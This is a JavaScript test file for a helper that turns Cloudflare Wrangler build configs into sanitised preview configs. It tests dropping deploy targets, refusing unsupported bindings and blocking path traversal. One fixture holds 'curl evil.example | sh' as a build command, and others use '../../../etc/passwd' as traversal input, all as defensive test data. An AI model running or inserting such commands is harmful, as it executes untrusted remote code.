import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import path from 'node:path';
import { test } from 'node:test';
import { buildPreviewConfig, isEmptyValue } from '../scripts/lib/wrangler-config.mjs';

const vinext = JSON.parse(readFileSync(new URL('./data/vinext-wrangler.json', import.meta.url), 'utf8'));
const root = path.resolve('/bundle/files');
const outDir = path.resolve('/bundle');
const configDir = path.join(root, 'dist/server');
const d1 = {
  DB: { database_name: 'app-preview', database_id: '11111111-2222-4333-8444-555555555555', migrations_dir: path.join(root, 'drizzle') },
};

function build(raw, overrides = {}) {
  return buildPreviewConfig(raw, { name: 'app-preview', root, configDir, outDir, d1, vars: { MODE: 'preview' }, ...overrides });
}

test('a config written by the Cloudflare Vite plugin becomes a preview config', () => {
  const { config, dropped } = build(vinext);
  assert.deepEqual(dropped, []);
  assert.equal(config.name, 'app-preview');
  assert.equal(config.main, 'files/dist/server/index.js');
  assert.equal(config.base_dir, 'files/dist/server');
  assert.equal(config.no_bundle, true);
  assert.deepEqual(config.assets, { directory: 'files/dist/client' });
  assert.deepEqual(config.vars, { MODE: 'preview' });
  assert.deepEqual(config.d1_databases, [
    { binding: 'DB', database_name: 'app-preview', database_id: '11111111-2222-4333-8444-555555555555', migrations_dir: 'files/drizzle' },
  ]);
  assert.equal(config.workers_dev, true);
  assert.equal(config.preview_urls, true);
  assert.deepEqual(config.compatibility_flags, ['nodejs_compat']);
  assert.deepEqual(config.rules, vinext.rules);
  for (const key of ['legacy_env', 'topLevelName', 'dev', 'build', 'triggers', 'account_id', 'routes']) {
    assert.equal(key in config, false, `${key} should be dropped`);
  }
});

test('deploy targets and build commands are dropped and reported', () => {
  const { config, dropped } = build({
    ...vinext,
    account_id: 'a'.repeat(32),
    routes: [{ pattern: 'example.com/*', zone_name: 'example.com' }],
    triggers: { crons: ['0 * * * *'] },
    build: { command: 'curl evil.example | sh' },
    tail_consumers: [{ service: 'logs' }],
    some_future_key: { enabled: true },
  });
  assert.deepEqual(dropped.sort(), ['account_id', 'build.command', 'routes', 'some_future_key', 'tail_consumers', 'triggers']);
  for (const key of ['account_id', 'routes', 'triggers', 'build', 'tail_consumers', 'some_future_key']) assert.equal(key in config, false);
});

test('bindings a preview cannot have stop the upload', () => {
  assert.throws(() => build({ ...vinext, kv_namespaces: [{ binding: 'CACHE', id: 'x' }] }), /kv_namespaces/);
  assert.throws(() => build({ ...vinext, ai: { binding: 'AI' } }), /\bai\b/);
  assert.throws(() => build({ ...vinext, durable_objects: { bindings: [{ name: 'X', class_name: 'X' }] } }), /durable_objects/);
  assert.throws(() => build({ ...vinext, services: [{ binding: 'API', service: 'prod-api' }] }), /services/);
  // Empty placeholders, as generated configs carry them, are fine.
  build({ ...vinext, kv_namespaces: [], durable_objects: { bindings: [] }, queues: { producers: [], consumers: [] } });
});

test('every D1 binding in the build must be mapped', () => {
  assert.throws(() => build(vinext, { d1: {} }), /binds the D1 database DB/);
  const { config } = build(vinext, {
    d1: { ...d1, AUDIT: { database_name: 'audit-preview', database_id: '21111111-2222-4333-8444-555555555555' } },
  });
  assert.deepEqual(
    config.d1_databases.map((entry) => entry.binding),
    ['DB', 'AUDIT'],
  );
  assert.equal('migrations_dir' in config.d1_databases[1], false);
});

test('the build variables never reach the preview', () => {
  const { config } = build({ ...vinext, vars: { DATA_REFRESH_ENABLED: 'true', X402_ENABLED: 'true' } }, { vars: {} });
  assert.deepEqual(config.vars, {});
});

test('paths must stay inside the build output', () => {
  assert.throws(() => build({ ...vinext, main: '../../../etc/passwd' }), /outside the project/);
  assert.throws(() => build({ ...vinext, assets: { directory: '/etc' } }), /relative path/);
  assert.throws(() => build({ ...vinext, base_dir: '../..' }), /project root/);
});

test('unbundled Workers and empty configs are refused with a reason', () => {
  assert.throws(() => build({ ...vinext, no_bundle: undefined }), /no_bundle: true/);
  assert.throws(() => build({ name: 'x', compatibility_date: '2026-01-01' }), /nothing to upload/);
  assert.throws(() => build({ ...vinext, pages_build_output_dir: 'dist' }), /pages_build_output_dir/);
  assert.throws(() => build([]), /JSON object/);
});

test('an assets-only Worker needs no main', () => {
  const { config } = build({ name: 'site', compatibility_date: '2026-01-01', assets: { directory: '../client', not_found_handling: 'single-page-application' } });
  assert.deepEqual(config.assets, { directory: 'files/dist/client', not_found_handling: 'single-page-application' });
  assert.equal('main' in config, false);
});

test('isEmptyValue treats generated placeholders as empty', () => {
  assert.ok(isEmptyValue([]));
  assert.ok(isEmptyValue({ bindings: [] }));
  assert.ok(isEmptyValue({ producers: [], consumers: [] }));
  assert.ok(isEmptyValue(null));
  assert.ok(!isEmptyValue({ binding: 'AI' }));
  assert.ok(!isEmptyValue(0));
  assert.ok(!isEmptyValue(true));
});
